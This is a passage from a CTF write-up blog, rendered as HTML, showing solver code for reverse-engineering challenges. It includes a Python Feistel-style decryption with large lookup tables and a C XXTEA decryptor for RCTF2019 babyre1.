class="number">0xC66E4A8B</span>,<span class="number">0xEFD2B05F</span>,<span class="number">0xEA54005E</span>,<span class="number">0xBBCAD27C</span>,<span class="number">0x23B477DE</span>,<span class="number">0xE7ACF2EF</span>,<span class="number">0xDA45B6EB</span>,<span class="number">0xA2AB9714</span>,<span class="number">0xE2A9D8E4</span>,<span class="number">0xF7473FD7</span>,<span class="number">0xB79E7CE2</span>,<span class="number">0xB11BD3F7</span>,<span class="number">0x4B979910</span>,<span class="number">0x6ADBAD2A</span>,<span class="number">0xC23C23CA</span>,<span class="number">0x56B858FB</span>,<span class="number">0x8D3D9D78</span>,<span class="number">0x566BEF22</span>,<span class="number">0xF7C4648C</span>,<span class="number">0x270E5502</span>,<span class="number">0xD5153361</span>,<span class="number">0xB46605CA</span>,<span class="number">0xF0EA6E35</span>,<span class="number">0x248AA1D1</span>,<span class="number">0x37A904E7</span>,<span class="number">0xF9C409F8</span>,<span class="number">0xC7D6E847</span>,<span class="number">0x9DB3D65E</span>,<span class="number">0xEEAE0657</span>,<span class="number">0xED4B16E8</span>,<span class="number">0xAB272744</span>,<span class="number">0x8A69915A</span>,<span class="number">0xABF472DB</span>,<span class="number">0x431BAF68</span>,<span class="number">0x5D5A63F1</span>,<span class="number">0x5A241614</span>,<span class="number">0xA6DD595C</span>,<span class="number">0x62377A57</span>,<span class="number">0x2E1AA3AE</span>,<span class="number">0xC6C92EEE</span>,<span class="number">0x628F8657</span>,<span class="number">0x450BCD12</span>,<span class="number">0x19F51364</span>,<span class="number">0x14E560C7</span>,<span class="number">0xA47AF9FB</span>,<span class="number">0x1E9B75E1</span>,<span class="number">0x25C6B3BD</span>,<span class="number">0xEE134C8A</span>,<span class="number">0xED77A7B1</span>,<span class="number">0xA39BC567</span>,<span class="number">0x6249661A</span>,<span class="number">0xB1E1E269</span>,<span class="number">0xD4EEDA36</span>,<span class="number">0x52F1EB18</span>,<span class="number">0x783AB90C</span>,<span class="number">0x4F18A1B5</span>,<span class="number">0x6389A50E</span>,<span class="number">0x4158FF06</span>,<span class="number">0x288D47FA</span>,<span class="number">0x5FED30FD</span>,<span class="number">0x0702EFEE</span>,<span class="number">0x2D7E047E</span>,<span class="number">0x39CA116A</span>,<span class="number">0x1464EA6E</span>,<span class="number">0xEC17671D</span>,<span class="number">0x82461730</span>,<span class="number">0xDA992326</span>,<span class="number">0xA290BC72</span>,<span class="number">0xFE4DD1E1</span>,<span class="number">0x7C151D78</span>,<span class="number">0x896F2FA5</span>,<span class="number">0x7C143A6D</span>,<span class="number">0xEEBB14FD</span>,<span class="number">0x079E59DA</span>,<span class="number">0xB4CAFA56</span>,<span class="number">0xBB10D122</span>,<span class="number">0x0CA116CC</span>,<span class="number">0x5B9C3DDC</span>,<span class="number">0x5C01058E</span>,<span class="number">0xAFDBEC14</span>,<span class="number">0x997D56F4</span>,<span class="number">0x5B5D990A</span>,<span class="number">0x547664C2</span>,<span class="number">0x2F2F0E34</span>,<span class="number">0x3E575455</span>,<span class="number">0x118DD381</span>,<span class="number">0xD5DD373F</span>,<span class="number">0xCFD58F8F</span>,<span class="number">0xDD8414C3</span>,<span class="number">0x2ADE2230</span>,<span class="number">0x7BB8EED7</span>,<span class="number">0x7D578A25</span>,<span class="number">0xD69388CD</span>,<span class="number">0x66610227</span>,<span class="number">0x8EC11A15</span>,<span class="number">0x81E128E1</span>,<span class="number">0xA8C8365E</span>,<span class="number">0xF11A5E70</span>,<span class="number">0x516F9B89</span>,<span class="number">0x579A6702</span>,<span class="number">0x82453EB8</span>,<span class="number">0x3F3A711E</span>,<span class="number">0xA3BAF6BF</span>,<span class="number">0xA6A1E0EB</span>,<span class="number">0xD33DD107</span>,<span class="number">0xC9B45D9D</span>,<span class="number">0xD57C6ABB</span>,<span class="number">0x70951630</span>,<span class="number">0x0DA574F0</span>,<span class="number">0x8C364C1F</span>,<span class="number">0x018E5DB9</span>,<span class="number">0xA1C5517B</span>,<span class="number">0x79FF0653</span>,<span class="number">0x4060D6A9</span>,<span class="number">0x99B1B1C1</span>,<span class="number">0x0BCA6377</span>,<span class="number">0xF84546B2</span>,<span class="number">0x30A65E11</span>,<span class="number">0x286F3FAF</span>,<span class="number">0x15CF5B32</span>,<span class="number">0x21A457FE</span>,<span class="number">0x1B37F262</span>,<span class="number">0x60B7D2FE</span>,<span class="number">0x40BA4178</span>,<span class="number">0xB670B823</span>,<span class="number">0x98F45A98</span>,<span class="number">0x6012AFF7</span>,<span class="number">0xB65FF911</span>,<span class="number">0xEADBA9FE</span>,<span class="number">0x840DDCA9</span>,<span class="number">0x8B8CAF6A</span>,<span class="number">0xB7335C16</span>,<span class="number">0xA15856B7</span>,<span class="number">0xF2056C14</span>,<span class="number">0x74DC21D3</span>,<span class="number">0x2E26E414</span>,<span class="number">0x13515128</span>,<span class="number">0xA3EA4C1C</span>,<span class="number">0x1629376F</span>,<span class="number">0x9E1A8BBC</span>,<span class="number">0x745BFB36</span>,<span class="number">0x3C284848</span>,<span class="number">0x20D7056E</span>,<span class="number">0x9408F410</span>,<span class="number">0xF2EF22A5</span>,<span class="number">0x2AC8CFCF</span>,<span class="number">0xAFB2BC7E</span>,<span class="number">0xB9B33834</span>,<span class="number">0xA2E3ABBB</span>,<span class="number">0x82F760BC</span>,<span class="number">0xA08D613F</span>,<span class="number">0xD993A7DC</span>,<span class="number">0x0398B419</span>,<span class="number">0xF7076946</span>,<span class="number">0xD188A326</span>,<span class="number">0x556AF04D</span>,<span class="number">0xBABC157F</span>,<span class="number">0x1B5DC56F</span>,<span class="number">0xF142CE64</span>,<span class="number">0x8DA31C30</span>,<span class="number">0x47D32FF0</span>,<span class="number">0xC542462D</span>,<span class="number">0xB5C1C5F6</span>,<span class="number">0xAAE1126C</span>,<span class="number">0xA3B8E016</span>,<span class="number">0x4B510673</span>,<span class="number">0x6EE84CBF</span>,<span class="number">0x87729A96</span>,<span class="number">0xF8EA27BA</span>,<span class="number">0x1F727559</span>,<span class="number">0xB0E79D97</span>,<span class="number">0x95676F4A</span>,<span class="number">0xAAA351A2</span>,<span class="number">0x767CCA57</span>,<span class="number">0x60F3EC1C</span>,<span class="number">0x46F6737A</span>,<span class="number">0x3D16D3E7</span>,<span class="number">0x2D73F2D3</span>,<span class="number">0xDC214874</span>,<span class="number">0x29B40C25</span>,<span class="number">0x1959F9EE</span>,<span class="number">0xC6C9C4DE</span>,<span class="number">0xED342C68</span>,<span class="number">0x4C6C704C</span>,<span class="number">0xB2D7B5DB</span>,<span class="number">0xACCEAA9C</span>,<span class="number">0xD08C1AF8</span>,<span class="number">0x836B6CF0</span>,<span class="number">0x2EC53D53</span>,<span class="number">0xE5642FA1</span>,<span class="number">0x84EA2D1A</span>,<span class="number">0x17DFE4B9</span>,<span class="number">0xD7B34225</span>,<span class="number">0xD5D63737</span>,<span class="number">0x4E4E04B0</span>,<span class="number">0xCF55CF68</span>,<span class="number">0xD4A8DB0D</span>,<span class="number">0x0C012C96</span>,<span class="number">0x381568E3</span>,<span class="number">0x9236A510</span>,<span class="number">0xA5A264AF</span>,<span class="number">0xA4B97409</span>,<span class="number">0xD5D5C8CB</span>,<span class="number">0xF85BB6D8</span>,<span class="number">0xB017FD3D</span>,<span class="number">0x2E910D94</span>,<span class="number">0x707DD1E0</span>,<span class="number">0x5393787D</span>,<span class="number">0xD66A707C</span>,<span class="number">0xB48C276E</span>,<span class="number">0x47E94C4E</span>,<span class="number">0x656D90D5</span>,<span class="number">0xBC465549</span>,<span class="number">0xC94BD5A6</span>,<span class="number">0x1C60AFAC</span>,<span class="number">0x3C9AA09C</span>,<span class="number">0x3DFDB235</span>,<span class="number">0x3B21C194</span>,<span class="number">0x5787CDF2</span>,<span class="number">0x3532F09D</span>,<span class="number">0x4BE4DEB6</span>,<span class="number">0x44AD4BF8</span>,<span class="number">0xB36A893D</span>,<span class="number">0x821CBE39</span>,<span class="number">0x20B711AA</span>,<span class="number">0x77F2CF00</span>,<span class="number">0x8C3FB88A</span>,<span class="number">0xC0B9B168</span>,<span class="number">0x5D245929</span>,<span class="number">0xB7D5DAFB</span>,<span class="number">0x859D8F29</span>]</span><br><span class="line">v56 = [<span class="number">0xDA579091</span>,<span class="number">0x36589232</span>,<span class="number">0xE7B84792</span>,<span class="number">0x78E07F17</span>,<span class="number">0x36FA15A6</span>,<span class="number">0xF0427E9F</span>,<span class="number">0x71406628</span>,<span class="number">0xFA9B4784</span>,<span class="number">0xF2655356</span>,<span class="number">0x995944EC</span>,<span class="number">0x437C367D</span>,<span class="number">0xDBCDE65B</span>,<span class="number">0x6BA84E55</span>,<span class="number">0x308D07AE</span>,<span class="number">0x3DA486BB</span>,<span class="number">0x04E21B79</span>,<span class="number">0x6CE11C5B</span>,<span class="number">0x16ED3875</span>,<span class="number">0x883B60BA</span>,<span class="number">0xFB72C8DF</span>,<span class="number">0x4A086E1B</span>,<span class="number">0x9DC7E017</span>,<span class="number">0xF8DA215B</span>,<span class="number">0x0D5C5718</span>,<span class="number">0x68A5E75A</span>,<span class="number">0x920DD029</span>,<span class="number">0x8BDBB753</span>,<span class="number">0x523F494F</span>,<span class="number">0xF7038820</span>,<span class="number">0x8F173C5F</span>,<span class="number">0xE7B9C003</span>,<span class="number">0x0A175A5B</span>,<span class="number">0x783E2CCF</span>,<span class="number">0xCE606562</span>,<span class="number">0x746082D0</span>,<span class="number">0xF5E4B9B3</span>,<span class="number">0x8D3FE374</span>,<span class="number">0x38A38F39</span>,<span class="number">0xAD82BBDD</span>,<span class="number">0xAFD383B2</span>,<span class="number">0x00792D15</span>,<span class="number">0x0D18FDA0</span>,<span class="number">0x75413917</span>,<span class="number">0xCC60E9AB</span>,<span class="number">0x64AB36FA</span>,<span class="number">0x1B7C0F0B</span>,<span class="number">0x83810F82</span>,<span class="number">0x150942AA</span>,<span class="number">0x5E65471A</span>,<span class="number">0xC1CA3BD4</span>,<span class="number">0x29746D45</span>,<span class="number">0x09DAE078</span>,<span class="number">0x2919D6A8</span>,<span class="number">0x396F2A25</span>,<span class="number">0x536A4D3C</span>,<span class="number">0x579DAD7A</span>,<span class="number">0xCBC13F7D</span>,<span class="number">0x9F7ACA79</span>,<span class="number">0xA3E33AD9</span>,<span class="number">0x4455D4BF</span>,<span class="number">0x9DF3512E</span>,<span class="number">0xE8ADFADA</span>,<span class="number">0x1F28C704</span>,<span class="number">0x2EBCE471</span>,<span class="number">0xADC7D412</span>,<span class="number">0x5DF3B361</span>,<span class="number">0xD7BA20F0</span>,<span class="number">0xDB88BDB5</span>,<span class="number">0x04DAF222</span>,<span class="number">0x98D7B48E</span>,<span class="number">0x1F900BDB</span>,<span class="number">0xC34AC529</span>,<span class="number">0xFD3F8659</span>,<span class="number">0x12C202E7</span>,<span class="number">0x974775B5</span>,<span class="number">0xA511DC77</span>,<span class="number">0x59EDD580</span>,<span class="number">0xF69A10B5</span>,<span class="number">0x79EA901A</span>,<span class="number">0x64DF1444</span>,<span class="number">0x66C7B59B</span>,<span class="number">0xEBF10CB2</span>,<span class="number">0x769C7B29</span>,<span class="number">0xE5AF6BF1</span>,<span class="number">0xA1B398CF</span>,<span class="number">0xE16484A8</span>,<span class="number">0xB7764140</span>,<span class="number">0xF101A355</span>,<span class="number">0x37D24DD7</span>,<span class="number">0x7CAA2209</span>,<span class="number">0xFB8F2F11</span>,<span class="number">0xE69C7211</span>,<span class="number">0x12811348</span>,<span class="number">0xC0E9EA5E</span>,<span class="number">0xB7925FB8</span>,<span class="number">0x3C88C806</span>,<span class="number">0x0159C9E4</span>,<span class="number">0xC616699E</span>,<span class="number">0xACD60B32</span>,<span class="number">0xB30DDE1A</span>,<span class="number">0xDF39517E</span>,<span class="number">0xB93DEE31</span>,<span class="number">0x6E86159B</span>,<span class="number">0xC3616961</span>,<span class="number">0xB6C89355</span>,<span class="number">0x12AAC939</span>,<span class="number">0x3664BC33</span>,<span class="number">0x45E4BDC6</span>,<span class="number">0xE1719D67</span>,<span class="number">0x524055CA</span>,<span class="number">0xA839D8EB</span>,<span class="number">0x51EA04AD</span>,<span class="number">0xA6A4D406</span>,<span class="number">0xAD8832E3</span>,<span class="number">0xCA852837</span>,<span class="number">0xE142A6E3</span>,<span class="number">0xA1A400D6</span>,<span class="number">0xFA35744D</span>,<span class="number">0xBEF1E464</span>,<span class="number">0x997B4AF8</span>,<span class="number">0x6D40427C</span>,<span class="number">0xBF8974D3</span>,<span class="number">0x39A896F7</span>,<span class="number">0xCDACF64D</span>,<span class="number">0xA42E80DA</span>,<span class="number">0xE4461B32</span>,<span class="number">0xCCAD0577</span>,<span class="number">0xD895E7BD</span>,<span class="number">0x7DBB265A</span>,<span class="number">0x65852658</span>,<span class="number">0xCDA62FDE</span>,<span class="number">0xFAD0669E</span>,<span class="number">0x4B3CE34E</span>,<span class="number">0xE05C7C73</span>,<span class="number">0xD891CD5C</span>,<span class="number">0x4FC4AA4B</span>,<span class="number">0x0D1DC690</span>,<span class="number">0x57BEED7D</span>,<span class="number">0xDD09631E</span>,<span class="number">0x5DABD689</span>,<span class="number">0xD39B2958</span>,<span class="number">0x72441210</span>,<span class="number">0xD7E9B2E8</span>,<span class="number">0xA7B762E5</span>,<span class="number">0x0494F61F</span>,<span class="number">0x53A5E356</span>,<span class="number">0xF7978852</span>,<span class="number">0xB324B320</span>,<span class="number">0x13F42919</span>,<span class="number">0xA9F7BE79</span>,<span class="number">0x446D36E7</span>,<span class="number">0xA8445880</span>,<span class="number">0x1C1CA702</span>,<span class="number">0x13C2ACA2</span>,<span class="number">0xEB066DD4</span>,<span class="number">0x7891D1DC</span>,<span class="number">0x65AD6853</span>,<span class="number">0xB3D70960</span>,<span class="number">0x8B6FA2C7</span>,<span class="number">0xC62583D6</span>,<span class="number">0x5AD90C97</span>,<span class="number">0x3423D303</span>,<span class="number">0xC2E13FE7</span>,<span class="number">0xD265DE71</span>,<span class="number">0xEB31AA78</span>,<span class="number">0x7582CFDF</span>,<span class="number">0x0427E371</span>,<span class="number">0x76495A72</span>,<span class="number">0x4B47B543</span>,<span class="number">0x767211EC</span>,<span class="number">0x5EEC75DB</span>,<span class="number">0xBC0281A3</span>,<span class="number">0x3100BEDA</span>,<span class="number">0x9BF13F32</span>,<span class="number">0x4625717F</span>,<span class="number">0x110DB24A</span>,<span class="number">0x0E55CE10</span>,<span class="number">0xF4FBB28F</span>,<span class="number">0x8B75227D</span>,<span class="number">0xC3DA7A8A</span>,<span class="number">0xB826CA8F</span>,<span class="number">0x5D8D6195</span>,<span class="number">0xE0029488</span>,<span class="number">0x888055C5</span>,<span class="number">0x781F037A</span>,<span class="number">0xC9F5486A</span>,<span class="number">0xCDF260D9</span>,<span class="number">0xCC30B60F</span>,<span class="number">0x4462550C</span>,<span class="number">0x688C013A</span>,<span class="number">0x9A44D732</span>,<span class="number">0xB0389A34</span>,<span class="number">0x60BA7236</span>,<span class="number">0xFE758D77</span>,<span class="number">0xDFF7E69A</span>,<span class="number">0xF6159765</span>,<span class="number">0x824DF1A0</span>,<span class="number">0x7634D70C</span>,<span class="number">0xC90EA62F</span>,<span class="number">0x600B3B99</span>,<span class="number">0x886F8556</span>,<span class="number">0xC66BAF96</span>,<span class="number">0x52E382AF</span>,<span class="number">0x733CAAD9</span>,<span class="number">0x9B92D0A5</span>,<span class="number">0xCFB3E9CA</span>,<span class="number">0xEB0AD91A</span>,<span class="number">0xD80D780F</span>,<span class="number">0x399C80F5</span>,<span class="number">0xDC9DF1A6</span>,<span class="number">0x319E19B4</span>,<span class="number">0x7E0D0F72</span>,<span class="number">0x03CC646D</span>,<span class="number">0x701A7074</span>,<span class="number">0x5263E055</span>,<span class="number">0xA4FD7B32</span>,<span class="number">0x9C8ACE37</span>,<span class="number">0xE853F925</span>,<span class="number">0x4F4C4C80</span>,<span class="number">0x73502E76</span>,<span class="number">0x341064E2</span>,<span class="number">0xEDF99D78</span>,<span class="number">0x7ED987B6</span>,<span class="number">0xC3B0C7C8</span>,<span class="number">0x28AE1BD0</span>,<span class="number">0x87B50B85</span>,<span class="number">0xB0E2F87D</span>,<span class="number">0xA95837A8</span>,<span class="number">0x84788413</span>,<span class="number">0xA56C5CF9</span>,<span class="number">0xB3EACFE6</span>,<span class="number">0x2820F4A1</span>,<span class="number">0xC690DC48</span>,<span class="number">0x63C0B2C0</span>,<span class="number">0x0B2794E7</span>,<span class="number">0x833C4137</span>,<span class="number">0xAA7F87B8</span>,<span class="number">0xC9E4252D</span>,<span class="number">0xAC459CCF</span>,<span class="number">0x57733C5F</span>,<span class="number">0xB83E0392</span>,<span class="number">0x64FAF7F2</span>,<span class="number">0xED2B2884</span>,<span class="number">0x8CEA3055</span>,<span class="number">0xC87B67C0</span>,<span class="number">0xE28ECB13</span>,<span class="number">0x0440A06E</span>,<span class="number">0x28164E5A</span>,<span class="number">0xF52FBC43</span>,<span class="number">0xC347BDE0</span>,<span class="number">0xA7463ACD</span>,<span class="number">0x4659105E</span>,<span class="number">0xFC68D479</span>,<span class="number">0x0D893FC0</span>,<span class="number">0xCDAA86FC</span>,<span class="number">0x1D380A6F</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t=<span class="string">b&#x27;ddddwwwaaawwwddd&#x27;</span></span><br><span class="line">ra = t[<span class="number">0</span>]|t[<span class="number">1</span>]&lt;&lt;<span class="number">8</span>|t[<span class="number">2</span>]&lt;&lt;<span class="number">16</span>|t[<span class="number">3</span>]&lt;&lt;<span class="number">24</span></span><br><span class="line">rb = t[<span class="number">4</span>]|t[<span class="number">5</span>]&lt;&lt;<span class="number">8</span>|t[<span class="number">6</span>]&lt;&lt;<span class="number">16</span>|t[<span class="number">7</span>]&lt;&lt;<span class="number">24</span></span><br><span class="line">rc = t[<span class="number">8</span>]|t[<span class="number">9</span>]&lt;&lt;<span class="number">8</span>|t[<span class="number">10</span>]&lt;&lt;<span class="number">16</span>|t[<span class="number">11</span>]&lt;&lt;<span class="number">24</span></span><br><span class="line">rd = t[<span class="number">12</span>]|t[<span class="number">13</span>]&lt;&lt;<span class="number">8</span>|t[<span class="number">14</span>]&lt;&lt;<span class="number">16</span>|t[<span class="number">15</span>]&lt;&lt;<span class="number">24</span></span><br><span class="line">swapByte = <span class="keyword">lambda</span> _x:(((_x&amp;<span class="number">0xff</span>)&lt;&lt;<span class="number">24</span>)|((_x&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>)|((_x&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">8</span>)|((_x&amp;<span class="number">0xff00</span>)&lt;&lt;<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#2 v15=0xc3a86870 v16=0xC9BD8E1E v18=0xC9BD8E1E</span></span><br><span class="line"><span class="comment">#1 v15=0x88761BFB v16=0x8D68F881 v18=0x8D68F881</span></span><br><span class="line"><span class="comment">#0 v18=45B37198 v16=F9B8CE1A</span></span><br><span class="line"><span class="comment"># v18=8493F258 v16=91B112F8</span></span><br><span class="line"></span><br><span class="line">ra = <span class="number">0x58f29384</span></span><br><span class="line">rb = <span class="number">0xf812b191</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    a = swapByte(a)</span><br><span class="line">    b = swapByte(b)</span><br><span class="line">    print(hex(a),hex(b))</span><br><span class="line">    a^=c1</span><br><span class="line">    b^=c2</span><br><span class="line">    a&amp;=<span class="number">0xffffffff</span></span><br><span class="line">    b&amp;=<span class="number">0xffffffff</span></span><br><span class="line">    print(hex(a),hex(b))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        x = a^c3[i]</span><br><span class="line">        x&amp;=<span class="number">0xffffffff</span></span><br><span class="line">        print(hex(v56[(a&amp;<span class="number">0xff</span>)]),hex(v55[(a&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>]),hex(v54[(a&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span>]),hex(v53[(a&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>]))</span><br><span class="line">        y = b^(v56[(a&amp;<span class="number">0xff</span>)]+(v55[(a&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>]^(v54[(a&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span>]+v53[(a&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>])))</span><br><span class="line">        y&amp;=<span class="number">0xffffffff</span></span><br><span class="line">        print(hex(x),hex(y))</span><br><span class="line">        a=y</span><br><span class="line">        b=x</span><br><span class="line">    <span class="keyword">return</span> a,b</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;====================&#x27;</span>)</span><br><span class="line">ra,rb = change(ra,rb)</span><br><span class="line">print(<span class="string">&#x27;====================&#x27;</span>)</span><br><span class="line">rc,rd = change(rc,rd)</span><br><span class="line">print(<span class="string">&#x27;====================&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(hex(ra),hex(rb),hex(rc),hex(rd))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 605c5235 db824ef8 2ff8e087 b4bbacfa</span></span><br><span class="line"><span class="comment"># db824ef8605c5235b4bbacfa2ff8e087</span></span><br></pre></td></tr></table></figure>

<h2 id="rev-RCTF2019-babyre1"><a href="#rev-RCTF2019-babyre1" class="headerlink" title="[rev][RCTF2019]babyre1"></a>[rev][RCTF2019]babyre1</h2><ol>
<li>base16解码</li>
<li>xxtea解密</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int8_t</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125; TreeNode;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint8_t</span> *v, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> y, z, sum;  </span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;  </span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;  </span><br><span class="line">        sum = <span class="number">0</span>;  </span><br><span class="line">        z = v[n<span class="number">-1</span>];  </span><br><span class="line">        <span class="keyword">do</span>  </span><br><span class="line">        &#123;  </span><br><span class="line">            sum += DELTA;  </span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;  </span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)  </span><br><span class="line">            &#123;  </span><br><span class="line">                y = v[p+<span class="number">1</span>];  </span><br><span class="line">                z = v[p] += MX;  </span><br><span class="line">            &#125;  </span><br><span class="line">            y = v[<span class="number">0</span>];  </span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">while</span> (--rounds);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        n = -n;  </span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;  </span><br><span class="line">        sum = rounds*DELTA;  </span><br><span class="line">        y = v[<span class="number">0</span>];  </span><br><span class="line">        <span class="keyword">do</span>  </span><br><span class="line">        &#123;  </span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;  </span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)  </span><br><span class="line">            &#123;  </span><br><span class="line">                z = v[p<span class="number">-1</span>];  </span><br><span class="line">                y = v[p] -= MX;  </span><br><span class="line">            &#125;  </span><br><span class="line">            z = v[n<span class="number">-1</span>];  </span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;  </span><br><span class="line">            sum -= DELTA;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">while</span> (--rounds);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> target[] = <span class="string">&quot;Bingo!\x00\x02&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        target[i]^=<span class="number">0x17</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,target);</span><br><span class="line">    printArray(<span class="string">&quot;flag_1&quot;</span>,target,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> k[] = &#123;<span class="number">0xE0C7E0C7</span>,<span class="number">0xC6F1D3D7</span>,<span class="number">0xC6D3C6D3</span>,<span class="number">0xC4D0D2CE</span>&#125;;</span><br><span class="line">    btea((<span class="keyword">uint32_t</span>*)target,<span class="number">2</span>,k);</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,target,<span 